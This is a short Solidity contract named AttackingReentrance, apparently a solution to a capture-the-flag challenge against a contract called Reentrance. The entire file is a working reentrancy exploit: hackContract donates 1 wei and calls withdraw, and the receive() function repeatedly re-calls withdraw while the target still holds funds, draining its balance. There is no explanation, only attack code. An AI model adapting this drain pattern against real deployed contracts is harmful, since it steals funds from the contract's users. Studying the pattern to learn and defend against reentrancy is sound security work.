// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance reentranceContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentranceContract = Reentrance(contractAddress);
    }
    receive() external payable{
        if (contractAddress.balance >= 1) {
            reentranceContract.withdraw();
        }
    }
    function hackContract() external {
        reentranceContract.donate{value: 1}(address(this));
        reentranceContract.withdraw();

    }
}
